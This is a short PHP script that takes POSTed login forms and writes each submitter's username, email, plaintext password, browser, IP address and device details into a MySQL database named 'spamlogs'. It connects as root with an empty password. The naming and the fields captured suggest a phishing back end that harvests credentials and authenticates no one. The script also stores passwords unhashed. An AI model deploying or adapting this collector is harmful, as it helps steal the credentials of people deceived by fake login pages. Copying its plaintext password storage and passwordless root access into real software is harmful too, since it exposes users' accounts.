<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    // Your login handling code here

    // Database connection details
    $host = 'localhost';
    $db = 'spamlogs';
    $user = 'root';
    $pass = '';

    $conn = new mysqli($host, $user, $pass, $db);
    
    if ($conn->connect_error) {
        die("Connection failed: " . $conn->connect_error);
    }

    // Capture form data
    $username = $_POST['username'];
    $email = $_POST['email'];
    $password = $_POST['password'];
    $browser_details = $_POST['browser_details'];
    $ip_address = $_POST['ip_address'];
    $device_details = $_POST['device_details'];

    // Prepare SQL statement
    $stmt = $conn->prepare("INSERT INTO user_logins (username, email, password, browser_details, ip_address, device_details) VALUES (?, ?, ?, ?, ?, ?)");
    $stmt->bind_param("ssssss", $username, $email, $password, $browser_details, $ip_address, $device_details);

    if ($stmt->execute()) {
        echo "Login details stored successfully!";
    } else {
        echo "Error: " . $stmt->error;
    }

    $stmt->close();
    $conn->close();
} else {
    // If request method is not POST, show error message
    http_response_code(405); // Set the HTTP response code to 405
    echo "Error 405: Method Not Allowed";
}
?>
